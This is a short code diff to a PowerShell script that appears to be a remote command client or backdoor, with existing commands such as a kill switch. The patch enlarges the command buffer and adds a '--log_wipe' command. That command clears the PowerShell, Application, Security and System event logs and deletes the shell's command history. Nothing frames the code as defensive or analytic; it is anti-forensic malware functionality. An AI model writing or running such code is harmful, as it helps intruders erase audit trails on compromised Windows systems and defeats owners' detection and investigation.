@@ -25,7 +25,7 @@ try {
 	$reader = New-Object System.IO.StreamReader($stream);
 	$writer.WriteLine("startup");
 	$writer.Flush();
-	$cmd_buff = [char[]]::new(1024)
+	$cmd_buff = [char[]]::new(2048)
 	$exit = 0;
 	$reading = $false
 	$terminate = $false;
@@ -54,6 +54,15 @@ try {
 							$client_writer.Flush();
 							$client.Close();
 							$exit = 1;
+						} elseif ($launch -match "--log_wipe") {
+							Clear-EventLog -LogName 'Windows PowerShell';
+							Clear-EventLog -LogName Application;
+							Clear-EventLog -LogName Security;
+							Clear-EventLog -LogName System;
+							Clear-History
+							Remove-Item (Get-PSReadlineOption).HistorySavePath
+							$client_writer.WriteLine(" ");
+							$client_writer.Flush();
 						} elseif ($launch -match "--kill_switch") {
 							$client_writer.WriteLine("client terminated.");
 							$client_writer.Flush();
